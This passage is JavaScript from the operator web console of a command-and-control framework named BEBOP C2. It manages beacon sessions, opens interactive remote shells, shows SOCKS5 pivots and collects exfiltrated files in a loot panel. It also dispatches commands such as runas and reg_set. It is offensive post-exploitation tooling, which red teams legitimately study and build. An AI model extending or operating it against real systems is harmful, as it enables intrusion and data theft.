            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ beacon_id: bid, port: 4443 })
        });
        if (resp.ok) {
            appendLine(PROMPT_STR + 'interactive', 'cmd-echo');
            appendLine('[*] interactive session requested — beacon will connect on next checkin', 'info');
            return true;
        } else {
            const txt = await resp.text();
            appendLine('[!] ' + txt, 'err');
            return false;
        }
    } catch (e) {
        appendLine('[!] interactive request error: ' + e.message, 'err');
        return false;
    }
}

function stopShell(bid) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    authFetch(tsUrl + '/api/task', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ beacon_id: bid, type: 24, code: 0, args: '' })
    }).catch(function(){});
    _activeShells.delete(bid);
    const entry = _shellWsMap.get(bid);
    if (entry && entry.ws) { entry.ws.close(); }
    _shellWsMap.delete(bid);
    const tabKey = 'shell_' + bid;
    if (_openTabs.has(tabKey)) {
        _openTabs.delete(tabKey);
        if (beaconId === tabKey) {
            beaconId = null;
            const shellEl = document.getElementById('shell-terminal');
            if (shellEl) shellEl.style.display = 'none';
        }
    }
    _renderTabs();
    _saveTabs();
}

function openShellTerminal(bid) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;

    const tabKey = 'shell_' + bid;

    // If shell tab already exists, just switch to it
    if (_openTabs.has(tabKey)) {
        _switchTab(tabKey);
        document.body.classList.add('panel-open');
        return;
    }

    // Save current beacon state
    _saveBeaconState(beaconId);

    // Create shell xterm if first time
    if (!_shellTerm) _initShellXterm();

    // Set active tab
    beaconId = tabKey;
    _activeShellBid = bid;

    // Show shell terminal, hide beacon terminal
    const termEl = document.getElementById('terminal');
    const shellEl = document.getElementById('shell-terminal');
    if (termEl) termEl.style.display = 'none';
    if (shellEl) shellEl.style.display = '';

    _shellTerm.clear();
    _shellTerm.write('\x1b[2J\x1b[H');

    document.body.classList.add('panel-open');

    if (sessionWs) { sessionWs.close(); sessionWs = null; }

    if (_activeShells.has(bid)) {
        // Reconnect to existing shell — skip mode detection, just open WebSocket
        const entry = _shellWsMap.get(bid);
        if (entry) { entry.localEcho = false; entry.modeSet = true; }
        _shellTerm.write('\x1b[90m[reconnecting to shell...]\x1b[0m\r\n');
        _connectShellWs(bid);
    } else {
        // First time — send TASK_SHELL_START
        authFetch(tsUrl + '/api/task', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ beacon_id: bid, type: 21, code: 0, args: '' })
        }).then(resp => {
            if (!resp.ok) {
                _shellTerm.write('\x1b[31m[failed to start shell]\x1b[0m\r\n');
                return;
            }
            _shellTerm.write('\r\n\x1b[33mConnection will be established on next callback...\x1b[0m\r\n');
            _activeShells.add(bid);
            _connectShellWs(bid);
        });
    }

    // Add tab
    _openTabs.set(tabKey, { hostname: 'SHELL', shellBid: bid });
    _fetchShellTabHostname(tabKey, bid);
    _renderTabs();
    _saveTabs();
    _shellTerm.focus();
}

function _initShellXterm() {
    let el = document.getElementById('shell-terminal');
    if (!el) {
        el = document.createElement('div');
        el.id = 'shell-terminal';
        el.style.display = 'none';
        const termEl = document.getElementById('terminal');
        if (termEl && termEl.parentNode) {
            termEl.parentNode.insertBefore(el, termEl.nextSibling);
        }
    }

    _shellTerm = new Terminal({
        fontFamily: "'Share Tech Mono', 'Courier New', monospace",
        fontSize: 14, letterSpacing: 0.5, lineHeight: 1.4,
        cursorBlink: true, cursorStyle: 'block',
        scrollback: 5000, allowTransparency: true,
        convertEol: true,
        theme: {
            background: '#000000', foreground: '#d4d4d4',
            cursor: '#c84b31', cursorAccent: '#000000',
            selectionBackground: 'rgba(200,75,49,0.25)',
            black:'#000000', red:'#c84b31', green:'#4a90a4', yellow:'#ffb000',
            blue:'#4a90a4', magenta:'#c84b31', cyan:'#4a90a4', white:'#e8d5a3',
        },
    });

    _shellFit = new FitAddon.FitAddon();
    _shellTerm.loadAddon(_shellFit);
    _shellTerm.open(el);
    try { _shellFit.fit(); } catch(_) {}
    new ResizeObserver(() => { try { _shellFit.fit(); } catch(_) {} }).observe(el);

    _shellTerm.onData(function(data) {
        const entry = _shellWsMap.get(_activeShellBid);
        if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
            if (entry.localEcho) {
                _shellTerm.write(data);
                data = data.replace(/\r/g, '\r\n');
            }
            entry.ws.send(data);
        }
    });
}

function _connectShellWs(bid) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;

    const existing = _shellWsMap.get(bid);
    if (existing && existing.ws && existing.ws.readyState <= WebSocket.OPEN) return;

    const wsProto = tsUrl.startsWith('https') ? 'wss' : 'ws';
    const wsHost = tsUrl.replace(/^https?:\/\//, '');
    const token = localStorage.getItem('authToken') || '';
    const ws = new WebSocket(wsProto + '://' + wsHost + '/ws/shell/' + bid + '?token=' + encodeURIComponent(token));
    ws.binaryType = 'arraybuffer';

    const entry = { ws: ws, buffer: [], localEcho: false, modeSet: false };
    _shellWsMap.set(bid, entry);

    ws.onopen = function() {
        if (entry.modeSet && _shellTerm && _activeShellBid === bid) {
            _shellTerm.write('\x1b[32m[shell reconnected]\x1b[0m\r\n');
            ws.send('\r');
        }
        if (_shellTerm && _activeShellBid === bid) _shellTerm.focus();
    };

    ws.onmessage = function(event) {
        let data = event.data instanceof ArrayBuffer
            ? new TextDecoder().decode(event.data) : event.data;

        if (!entry.modeSet) {
            entry.modeSet = true;
            if (data.startsWith('[conpty]\n')) {
                entry.localEcho = false;
                data = data.slice(9);
            } else if (data.startsWith('[pipes]\n')) {
                entry.localEcho = true;
                data = data.slice(8);
            }
            if (!data) return;
        }

        if (_activeShellBid === bid && _shellTerm) {
            _shellTerm.write(data, function() { _shellTerm.scrollToBottom(); });
        } else {
            entry.buffer.push(data);
        }
    };

    ws.onclose = function() {
        _shellWsMap.delete(bid);
        if (_activeShellBid === bid && _shellTerm) {
            _shellTerm.write('\r\n\x1b[90m[shell disconnected — close tab or click SHELL to reopen]\x1b[0m\r\n');
        }
    };

    ws.onerror = function() {
        if (ws.readyState !== WebSocket.CLOSED) ws.close();
    };
}

async function _fetchShellTabHostname(tabKey, bid) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp = await authFetch(tsUrl + '/api/sessions');
        const beacons = await resp.json();
        const b = beacons.find(x => x.id === bid);
        if (b && b.hostname) {
            const tab = _openTabs.get(tabKey);
            if (tab) { tab.hostname = b.hostname; _renderTabs(); _saveTabs(); }
        }
    } catch(_) {}
}

function _renderSessionsList(beacons) {
    const noMsg = document.getElementById('no-sessions');

    updateConnIndicator(true);

    const aliveBeacons = beacons.filter(b => b.alive).length;
    const titleEl = document.getElementById('sessions-title');
    if (titleEl) {
        titleEl.innerHTML = `Sessions <span class="count-minimal">// ${aliveBeacons} active</span>`;
    }

    if (_currentView === 'map') {
        renderMap(beacons);
    } else if (_currentView === 'table') {
        renderTable(beacons);
    }

    if (beacons.length === 0) {
        if (noMsg && _currentView !== 'map') {
            noMsg.innerHTML = 'No active beacons.' +
                '<span class="empty-quote">"You\'re gonna carry that weight."</span>';
            noMsg.style.display = '';
        } else if (noMsg) {
            noMsg.style.display = 'none';
        }
        if (_knownBeaconIds === null) _knownBeaconIds = new Set();
        return;
    }
    if (noMsg) noMsg.style.display = 'none';

    // Toast + event log for new beacons
    if (_knownBeaconIds === null) {
        _knownBeaconIds = new Set();
        _knownBeaconAlive = {};
        for (const b of beacons) {
            _knownBeaconIds.add(b.id);
            _knownBeaconAlive[b.id] = b.alive;
            _beaconModes[b.id] = b.mode || 'beacon';
        }
    } else {
        for (const b of beacons) {
            if (!_knownBeaconIds.has(b.id)) {
                _knownBeaconIds.add(b.id);
                _knownBeaconAlive[b.id] = b.alive;
                showToast(b.hostname || '?', b.username || '?');
            }
            _knownBeaconAlive[b.id] = b.alive;
            _beaconModes[b.id] = b.mode || 'beacon';
        }
    }
}

function _renderSessionsFromCache() {
    _renderSessionsList(Object.values(_beacons));
}

// ── Operator WebSocket (replaces polling) ──────────────────────────
let _operatorWs = null;
let _wsReconnectDelay = 1000;
let _wsReconnectTimer = null;

function connectOperatorWs() {
    if (_operatorWs && _operatorWs.readyState <= WebSocket.OPEN) return;

    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const host = tsUrl.replace(/^https?:\/\//, '');
    const token = localStorage.getItem('authToken') || '';
    const wsUrl = `${proto}//${host}/ws/operator?token=${encodeURIComponent(token)}`;
    _operatorWs = new WebSocket(wsUrl);

    _operatorWs.onopen = () => {
        console.log('[ws] operator connected');
        _wsReconnectDelay = 1000;
    };

    _operatorWs.onclose = () => {
        console.log('[ws] operator disconnected, reconnecting in', _wsReconnectDelay, 'ms');
        _operatorWs = null;
        _wsReconnectTimer = setTimeout(() => {
            connectOperatorWs();
        }, _wsReconnectDelay);
        _wsReconnectDelay = Math.min(_wsReconnectDelay * 2, 30000);
    };

    _operatorWs.onerror = () => {};

    _operatorWs.onmessage = (ev) => {
        let msg;
        try { msg = JSON.parse(ev.data); } catch { return; }
        _handleWsMessage(msg);
    };
}

function _handleWsMessage(msg) {
    const { topic, action, data } = msg;
    switch (topic) {
        case 'sessions':
            _handleSessionsMsg(action, data);
            break;
        case 'results':
            _handleResultsMsg(action, data);
            break;
        case 'events':
            _handleEventsMsg(action, data);
            break;
        case 'loot':
            _handleLootMsg(action, data);
            break;
        case 'listeners':
            _handleListenersMsg(action, data);
            break;
        case 'socks':
            _handleSocksMsg(action, data);
            break;
        case 'chat':
            _handleChatMsg(action, data);
            break;
    }
}

function _handleSessionsMsg(action, data) {
    if (action === 'sync') {
        _beacons = {};
        if (Array.isArray(data)) {
            data.forEach(b => { _beacons[b.id] = b; });
        }
        _renderSessionsFromCache();
        _refreshOpenTabHostnames();
        return;
    }
    if (action === 'add') {
        const isNew = !_beacons[data.id];
        _beacons[data.id] = data;
        _renderSessionsFromCache();
        if (isNew) {
            showToast(data.hostname, data.username);
        }
        return;
    }
    if (action === 'checkin') {
        const b = _beacons[data.id];
        if (b) {
            const wasAlive = b.alive;
            b.last_seen = Math.floor(Date.now() / 1000);
            b.alive = true;
            if (data.id === _actualBid() && !_isSessionTab() && (_pendingTasks[beaconId] || 0) > 0) {
                appendLine('[+] task delivered to beacon', 'hint');
                _pendingTasks[beaconId]--;
                _writePrompt();
                if (_term) _term.scrollToBottom();
            }
            if (!wasAlive) {
                _renderSessionsFromCache();
            } else {
                const td = document.querySelector(`tr[data-beacon-id="${data.id}"] td[data-ts]`);
                if (td) { td.dataset.ts = b.last_seen; td.textContent = timeAgo(b.last_seen); }
            }
        }
        return;
    }
    if (action === 'update') {
        const b = _beacons[data.id];
        if (b) {
            if (data.sleep !== undefined) b.sleep = data.sleep;
            if (data.jitter !== undefined) b.jitter = data.jitter;
            if (data.mode !== undefined) b.mode = data.mode;
            if (data.shell_active !== undefined) b.shell_active = data.shell_active;
            if (data.socks_active !== undefined) b.socks_active = data.socks_active;
            if (data.socks_host !== undefined) b.socks_host = data.socks_host;
            if (data.socks_port !== undefined) b.socks_port = data.socks_port;
            _renderSessionsFromCache();
        }
        return;
    }
    if (action === 'delete') {
        delete _beacons[data.id];
        _renderSessionsFromCache();
        return;
    }
}

function _handleResultsMsg(action, data) {
    if (action !== 'add') return;
    if (_isSessionTab()) return;
    if (data.beacon_id !== _actualBid()) return;
    if (data.label && !_tabLabels[data.label]) return;
    if (data.label && _tabLabels[data.label] !== beaconId) return;

    const result = {
        label: data.label,
        beacon_id: data.beacon_id,
        flags: data.flags || 0,
        type: data.type || 0,
        filename: data.filename || '',
        output: data.output,
        received_at: data.received_at
    };

    if (result.type === 3) {
        appendLine('[+] ' + (result.output || 'upload complete'), 'output');
    } else if (result.type === 4) {
        appendLine('[+] exfil complete: ' + (result.filename || '?'), 'output');
        appendLine('    check the LOOT tab to download or delete', 'hint');
        loadLootPanel();
    } else if (result.type === 2) {
        appendLine('[+] ' + (result.output || 'config updated'), 'hint');
    } else {
        appendLine(result.output || '', 'output');
    }
    if (data.received_at > pollSince) pollSince = data.received_at;
    if (_term) _term.scrollToBottom();
    _serverSaveDirty = true;
}

function _handleEventsMsg(action, data) {
    if (action === 'sync') {
        const panel = document.getElementById('event-log-body');
        if (!panel) return;
        panel.innerHTML = '';
        _eventLog = [];
        if (Array.isArray(data)) {
            data.forEach(evt => _appendEventEntry(evt));
        }
        return;
    }
    if (action === 'add') {
        _appendEventEntry(data);
        return;
    }
}

function _handleLootMsg(action, data) {
    if (action === 'add' || action === 'delete' || action === 'sync') {
        loadLootPanel();
    }
}

function _handleListenersMsg(action, data) {
    if (action === 'sync' || action === 'add' || action === 'delete') {
        loadListeners();
    }
}

function _handleSocksMsg(action, data) {
    if (action === 'started') {
        if (data && data.beacon_id != null) {
            const b = _beacons[data.beacon_id];
            if (b) {
                b.socks_active = true;
                b.socks_host   = data.host || '';
                b.socks_port   = data.port || 0;
            }
            updateSocksBadge(data.beacon_id, data.host || '', data.port || 0);
            const ts = _formatTs(new Date());
            _renderEventEntry(ts, 'SOCKS5 started for beacon #' + data.beacon_id + ' on ' + (data.host || '?') + ':' + (data.port || '?'));
        }
        return;
    }
    if (action === 'stopped') {
        if (data && data.beacon_id != null) {
            const b = _beacons[data.beacon_id];
            if (b) {
                b.socks_active = false;
                b.socks_host   = '';
                b.socks_port   = 0;
            }
            removeSocksBadge(data.beacon_id);
            const ts = _formatTs(new Date());
            _renderEventEntry(ts, 'SOCKS5 stopped for beacon #' + data.beacon_id);
        }
        return;
    }
}

function updateSocksBadge(beaconId, host, port) {
    const row = document.querySelector('#beacons-table tbody tr[data-beacon-id="' + beaconId + '"]');
    if (!row) return;
    // Status cell is td[0]; hostname cell is td[1] — badges live in td[1]
    const cell = row.cells[1];
    if (!cell) return;
    let badge = cell.querySelector('.badge-socks5');
    if (!badge) {
        badge = document.createElement('span');
        badge.className = 'badge-socks5';
        cell.appendChild(badge);
    }
    badge.textContent = 'SOCKS5 ' + host + ':' + port;
}

function removeSocksBadge(beaconId) {
    const row = document.querySelector('#beacons-table tbody tr[data-beacon-id="' + beaconId + '"]');
    if (!row) return;
    const badge = row.querySelector('.badge-socks5');
    if (badge) badge.parentNode.removeChild(badge);
}

async function loadSessions() {
    const tsUrl = getTsUrl();
    const noMsg = document.getElementById('no-sessions');

    if (!tsUrl) {
        if (noMsg) {
            noMsg.innerHTML = 'Enter teamserver IP and port above and click Connect.' +
                '<span class="empty-quote">"See you, space cowboy..."</span>';
            noMsg.style.display = '';
        }
        updateConnIndicator(false);
        return;
    }

    try {
        const resp    = await authFetch(tsUrl + '/api/sessions');
        if (!resp.ok) throw new Error('HTTP ' + resp.status);
        const beacons = await resp.json();
        _beacons = {};
        beacons.forEach(b => { _beacons[b.id] = b; });
        _renderSessionsList(beacons);
    } catch (e) {
        // If we have fresh data from the operator WebSocket, render from that
        // cache instead of showing an offline error — the WS is the primary
        // realtime source; the HTTP fetch is a bootstrap fallback.
        if (_beacons && Object.keys(_beacons).length > 0) {
            _renderSessionsFromCache();
            return;
        }
        if (noMsg) {
            noMsg.innerHTML = 'Cannot reach teamserver &mdash; ' + escapeHtml(e.message) +
                '<span class="empty-quote">"The music\'s over. Try again."</span>';
            noMsg.style.display = '';
        }
        updateConnIndicator(false);
        console.error('loadSessions:', e);
    }
}

// ---- Terminal / Interact (Xterm.js) ----

let cmdHistory   = [];
let historyIdx   = -1;
let pollSince        = 0;
let beaconId         = null;
const _pendingTasks  = {};
let _lastSeenPrev    = 0;

// Xterm state
let _term          = null;
let _fitAddon      = null;
let _inputBuf      = '';
let _cursorPos     = 0;
let _promptVisible = false;

// Per-beacon terminal history persistence (survives page navigation)
const _beaconStates = {};
let _outputLog = [];

async function _saveTerminalToServer(id) {
    if (id == null) return;
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    const state = _beaconStates[id];
    if (!state) return;
    try {
        await authFetch(tsUrl + '/api/terminal/' + id, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                output_log: state.outputLog,
                cmd_history: state.cmdHistory,
                poll_since: state.pollSince,
            }),
        });
    } catch (_) {}
}

async function _loadTerminalFromServer(id) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return null;
    try {
        const resp = await authFetch(tsUrl + '/api/terminal/' + id);
        if (!resp.ok) return null;
        const state = await resp.json();
        if (!state || !state.output_log) return null;
        return {
            outputLog: state.output_log,
            cmdHistory: state.cmd_history || [],
            pollSince: state.poll_since || 0,
        };
    } catch (_) {
        return null;
    }
}

function _saveTabs() {
    try {
        const tabs = [];
        for (const [id, tab] of _openTabs) {
            if (typeof id === 'string' && id.startsWith('shell_')) continue;
            tabs.push({ id, hostname: tab.hostname });
        }
        localStorage.setItem('bebop_tabs', JSON.stringify(tabs));
        const activeToSave = (typeof beaconId === 'string' && beaconId.startsWith('shell_')) ? '' : (beaconId != null ? String(beaconId) : '');
        localStorage.setItem('bebop_active', activeToSave);
        localStorage.setItem('bebop_panelOpen', document.body.classList.contains('panel-open') ? '1' : '0');
    } catch (_) {}
}

function _loadTabs() {
    try {
        const tabsRaw = localStorage.getItem('bebop_tabs');
        const activeRaw = localStorage.getItem('bebop_active');
        if (tabsRaw) {
            const tabs = JSON.parse(tabsRaw);
            for (const t of tabs) {
                _openTabs.set(t.id, { hostname: t.hostname });
                // Re-resolve stale/unknown hostnames from the current session list.
                const isShell = typeof t.id === 'string' && t.id.startsWith('shell_');
                const stale   = !t.hostname || t.hostname === '?' || (isShell && t.hostname === 'SHELL');
                if (stale) _fetchTabHostname(t.id);
            }
        }
        if (_openTabs.size > 0) {
            if (activeRaw) {
                const activeId = parseInt(activeRaw, 10);
                if (!isNaN(activeId) && _openTabs.has(activeId)) return activeId;
            }
            return _openTabs.keys().next().value;
        }
    } catch (_) {}
    return null;
}

let _serverSaveDirty = false;

setInterval(async () => {
    if (!_serverSaveDirty || beaconId == null) return;
    if (typeof beaconId === 'string' && beaconId.startsWith('shell_')) return;
    _beaconStates[beaconId] = {
        outputLog: _outputLog.slice(),
        cmdHistory: cmdHistory.slice(),
        pollSince: pollSince,
    };
    _saveTerminalToServer(beaconId);
    _serverSaveDirty = false;
}, 2000);

function _saveBeaconState(id) {
    if (id == null || !_term) return;
    if (typeof id === 'string' && id.startsWith('shell_')) return;
    _beaconStates[id] = {
        outputLog:  _outputLog.slice(),
        cmdHistory: cmdHistory.slice(),
        pollSince:  pollSince,
    };
    _saveTerminalToServer(id);
    _saveTabs();
}

function _restoreBeaconState(id) {
    const state = _beaconStates[id];
    if (!state) return false;
    cmdHistory = state.cmdHistory.slice();
    pollSince  = state.pollSince;
    _outputLog = state.outputLog.slice();
    _promptVisible = false;
    _inputBuf = '';
    _cursorPos = 0;
    for (const entry of _outputLog) {
        _replayLine(entry.text, entry.cls);
    }
    return true;
}

function _replayLine(text, cls) {
    if (!_term) return;
    if (cls === 'cmd-echo') {
        _term.writeln(text + ANSI.reset);
        return;
    }
    const normalized = String(text).replace(/\r\n/g, '\n').replace(/\r/g, '\n').trimEnd();
    if (!normalized.trim()) return;
    let color;
    switch (cls) {
        case 'err':  color = ANSI.red;              break;
        case 'hint': color = ANSI.dim + ANSI.amber; break;
        default:     color = ANSI.cream;             break;
    }
    const lines = normalized.split('\n');
    for (const line of lines) _term.writeln(color + line + ANSI.reset);
}

// ---- Event Log (server-persisted) ----

let _eventLog = [];

function _formatTs(date) {
    return String(date.getHours()).padStart(2, '0') + ':' +
           String(date.getMinutes()).padStart(2, '0') + ':' +
           String(date.getSeconds()).padStart(2, '0');
}

function _renderEventEntry(ts, msg) {
    const body = document.getElementById('event-log-body');
    if (!body) return;
    const emptyEl = body.querySelector('.event-log-empty');
    if (emptyEl) emptyEl.remove();
    const entry = document.createElement('div');
    entry.className = 'event-log-entry';
    const tsSpan = document.createElement('span');
    tsSpan.className = 'event-log-ts';
    tsSpan.textContent = ts;
    const msgSpan = document.createElement('span');
    msgSpan.className = 'event-log-msg';
    msgSpan.textContent = msg;
    entry.appendChild(tsSpan);
    entry.appendChild(msgSpan);
    body.appendChild(entry);
    body.scrollTop = body.scrollHeight;
}

function _appendEventEntry(evt) {
    const d  = new Date(evt.timestamp);
    const ts = _formatTs(d);
    _eventLog.push({ ts, type: evt.type, msg: evt.message });
    _renderEventEntry(ts, evt.message);
}

async function loadEventLog() {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp = await authFetch(tsUrl + '/api/events');
        if (!resp.ok) return;
        const events = await resp.json();
        if (!events) return;

        const knownCount = _eventLog.length;
        if (events.length <= knownCount) return;

        if (knownCount === 0) {
            const body = document.getElementById('event-log-body');
            if (body) body.innerHTML = '';
        }

        for (let i = knownCount; i < events.length; i++) {
            _appendEventEntry(events[i]);
        }
    } catch (_) {}
}

function exportEventLog(e) {
    if (e) e.stopPropagation();
    if (_eventLog.length === 0) return;

    const date = new Date();
    const dateStr = date.toISOString().slice(0, 10);
    const lines = [
        '# BEBOP C2 — Event Log Export',
        '# Date: ' + date.toISOString(),
        '# Events: ' + _eventLog.length,
        '#' + '-'.repeat(60),
        '',
    ];

    const stripHtml = (s) => s.replace(/<[^>]*>/g, '');

    for (const ev of _eventLog) {
        lines.push('[' + ev.ts + '] ' + stripHtml(ev.msg));
    }

    lines.push('', '# END OF LOG');

    const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href     = url;
    a.download = 'bebop-eventlog-' + dateStr + '.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

const ANSI = {
    reset: '\x1b[0m',
    amber: '\x1b[33m',
    cream: '\x1b[97m',
    red:   '\x1b[91m',
    dim:   '\x1b[2m',
};

const PROMPT_STR = ANSI.amber + '[BEBOP ~]$ ' + ANSI.reset;

// ---- Xterm helpers ----

function _writePrompt() {
    _promptVisible = true;
    _term.write(PROMPT_STR);
}

function _redrawTail() {
    const tail = _inputBuf.slice(_cursorPos);
    _term.write('\x1b[K' + tail);
    if (tail.length > 0) _term.write('\x1b[' + tail.length + 'D');
}

function _replaceBuffer(val) {
    if (_cursorPos > 0) _term.write('\x1b[' + _cursorPos + 'D');
    _term.write('\x1b[K' + val);
    _inputBuf  = val;
    _cursorPos = val.length;
}

function appendLine(text, cls) {
    if (!_term) return;
    const normalized = String(text).replace(/\r\n/g, '\n').replace(/\r/g, '\n').trimEnd();
    if (!normalized.trim()) return;
    _serverSaveDirty = true;

    _outputLog.push({ text, cls });

    let color;
    switch (cls) {
        case 'cmd-echo': color = ANSI.cream;            break;
        case 'err':      color = ANSI.red;              break;
        case 'hint':     color = ANSI.dim + ANSI.amber; break;
        default:         color = ANSI.cream;            break;
    }

    const lines = normalized.split('\n');

    if (_promptVisible) {
        if (_cursorPos > 0) _term.write('\x1b[' + _cursorPos + 'D');
        _term.write('\r\x1b[K');
        for (const line of lines) _term.write(color + line + ANSI.reset + '\r\n');
        _term.write(PROMPT_STR + _inputBuf);
        if (_cursorPos < _inputBuf.length) {
            _term.write('\x1b[' + (_inputBuf.length - _cursorPos) + 'D');
        }
    } else {
        for (const line of lines) _term.writeln(color + line + ANSI.reset);
    }

    if (cls !== 'cmd-echo' && text.trim()) {
        const orig = document.title.replace(/^\[★\] /, '');
        document.title = '[★] ' + orig;
        setTimeout(() => { document.title = orig; }, 4000);
    }
}

// ---- Tab completion ----

function _handleTab() {
    if (!_inputBuf) return;
    const word    = _inputBuf.split(/\s+/)[0].toLowerCase();
    const matches = VALID_COMMANDS.filter(c => c.startsWith(word));
    if (matches.length === 1) {
        const rest = _inputBuf.indexOf(' ') >= 0 ? _inputBuf.slice(_inputBuf.indexOf(' ')) : ' ';
        _replaceBuffer(matches[0] + rest);
    } else if (matches.length > 1) {
        _term.write('\r\n' + ANSI.dim + ANSI.amber + matches.join('   ') + ANSI.reset + '\r\n');
        _writePrompt();
        _term.write(_inputBuf);
        if (_cursorPos < _inputBuf.length) _term.write('\x1b[' + (_inputBuf.length - _cursorPos) + 'D');
    }
}

// ---- Line input handler ----

function _handleData(data) {

    switch (data) {
        case '\x1b[A': // Arrow Up
            if (!cmdHistory.length) return;
            historyIdx = Math.min(historyIdx + 1, cmdHistory.length - 1);
            _replaceBuffer(cmdHistory[historyIdx] || '');
            return;
        case '\x1b[B': // Arrow Down
            historyIdx = Math.max(historyIdx - 1, -1);
            _replaceBuffer(historyIdx >= 0 ? cmdHistory[historyIdx] : '');
            return;
        case '\x1b[C': // Right
            if (_cursorPos < _inputBuf.length) { _cursorPos++; _term.write('\x1b[C'); }
            return;
        case '\x1b[D': // Left
            if (_cursorPos > 0) { _cursorPos--; _term.write('\x1b[D'); }
            return;
        case '\x01': case '\x1b[H': // Ctrl+A / Home
            if (_cursorPos > 0) { _term.write('\x1b[' + _cursorPos + 'D'); _cursorPos = 0; }
            return;
        case '\x05': case '\x1b[F': // Ctrl+E / End
            if (_cursorPos < _inputBuf.length) {
                _term.write('\x1b[' + (_inputBuf.length - _cursorPos) + 'C');
                _cursorPos = _inputBuf.length;
            }
            return;
        case '\x7f': case '\b': // Backspace
            if (_cursorPos > 0) {
                _inputBuf  = _inputBuf.slice(0, _cursorPos - 1) + _inputBuf.slice(_cursorPos);
                _cursorPos--;
                _term.write('\b');
                _redrawTail();
            }
            return;
        case '\x1b[3~': // Delete
            if (_cursorPos < _inputBuf.length) {
                _inputBuf = _inputBuf.slice(0, _cursorPos) + _inputBuf.slice(_cursorPos + 1);
                _redrawTail();
            }
            return;
        case '\x15': // Ctrl+U — kill to start
            if (_cursorPos > 0) { _term.write('\x1b[' + _cursorPos + 'D'); _cursorPos = 0; }
            _inputBuf  = _inputBuf.slice(_cursorPos);
            _cursorPos = 0;
            _redrawTail();
            return;
        case '\x0b': // Ctrl+K — kill to end
            _inputBuf = _inputBuf.slice(0, _cursorPos);
            _term.write('\x1b[K');
            return;
        case '\x03': // Ctrl+C
            _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
            _term.write('^C\r\n');
            _writePrompt();
            return;
        case '\x0c': // Ctrl+L — clear screen + home, then fresh prompt
            _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
            _term.write('\x1b[2J\x1b[H');
            _writePrompt();
            return;
        case '\t':
            _handleTab();
            return;
        case '\r': case '\n': {
            const cmd  = _inputBuf.trim();
            _inputBuf  = ''; _cursorPos = 0; _promptVisible = false;
            _term.write('\r\n');
            if (cmd) _processCommand(cmd);
            else     _writePrompt();
            return;
        }
    }
    // Filter to printable characters (handles both single keypress and multi-char paste)
    const printable = data.replace(/[^\x20-\x7e]/g, '');
    if (printable.length > 0) {
        _inputBuf = _inputBuf.slice(0, _cursorPos) + printable + _inputBuf.slice(_cursorPos);
        _cursorPos += printable.length;
        _term.write(printable);
        if (_cursorPos < _inputBuf.length) {
            const tail = _inputBuf.slice(_cursorPos);
            _term.write(tail + '\x1b[' + tail.length + 'D');
        }
    }
}

// ---- Command dispatch ----

async function _processCommand(cmd) {
    const baseCmd = cmd.split(/\s+/)[0].toLowerCase();
    cmdHistory.unshift(cmd);
    if (cmdHistory.length > 100) cmdHistory.pop();
    historyIdx = -1;

    _outputLog.push({ text: PROMPT_STR + cmd, cls: 'cmd-echo' });
    _beaconStates[beaconId] = {
        outputLog: _outputLog.slice(),
        cmdHistory: cmdHistory.slice(),
        pollSince: pollSince,
    };
    _saveTerminalToServer(beaconId);
    _serverSaveDirty = false;

    if (cmd === 'help') {
        HELP_TEXT.forEach(line => appendLine(line, 'output'));
        _writePrompt();
        return;
    }

    if (cmd === 'clear') {
        _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
        _term.write('\x1b[2J\x1b[H');
        _writePrompt();
        return;
    }

    if (!VALID_COMMANDS.includes(baseCmd)) {
        appendLine(`[error] unknown command: "${baseCmd}". type "help" for a list of valid commands.`, 'err');
        _writePrompt();
        return;
    }

    const cmdArgs = cmd.slice(baseCmd.length).trim();
    const NEEDS_ARGS = {
        cd:        '<path>',
        cat:       '<file>',
        stat:      '<path>',
        mkdir:     '<path>',
        rm:        '<file>',
        rmdir:     '<path>',
        cp:        '<src> <dst>',
        mv:        '<src> <dst>',
        kill:      '<pid>',
        dns:       '<hostname>',
        reg_query: '<HIVE\\key> <value>',
        reg_set:   '<HIVE\\key> <value> <data>',
        runas:     '<user> <pass> <cmd>',
        /* shell: no args = interactive shell, with args = cmd.exe /c */
        sleep:     '<seconds> [jitter%]',
        getenv:    '<name>',
    };
    if (NEEDS_ARGS[baseCmd] && !cmdArgs) {
        appendLine('[error] usage: ' + baseCmd + ' ' + NEEDS_ARGS[baseCmd], 'err');
        _writePrompt();
        return;
    }
    if (baseCmd === 'kill') {
        const pid = parseInt(cmdArgs, 10);
        if (isNaN(pid) || pid <= 0) {
            appendLine('[error] kill requires a valid PID (number > 0)', 'err');
            _writePrompt(); return;
        }
    }
    if ((baseCmd === 'cp' || baseCmd === 'mv') && cmdArgs.split(/\s+/).length < 2) {
        appendLine('[error] usage: ' + baseCmd + ' <src> <dst>', 'err');
        _writePrompt(); return;
    }
    if (baseCmd === 'runas' && cmdArgs.split(/\s+/).length < 3) {
        appendLine('[error] usage: runas <user> <pass> <cmd>', 'err');
        _writePrompt(); return;
    }

    const tsUrl = getTsUrl();
    if (!tsUrl) { appendLine('[error] teamserver not configured', 'err'); _writePrompt(); return; }
    if (beaconId === null || isNaN(_actualBid())) {
        appendLine('[error] no beacon selected', 'err'); _writePrompt(); return;
    }

    // ---- Interactive session upgrade ----

    if (baseCmd === 'interactive') {
        showShellModal(_actualBid(), '');
        _writePrompt();
        return;
    }

    if (baseCmd === 'shell' && !cmdArgs) {
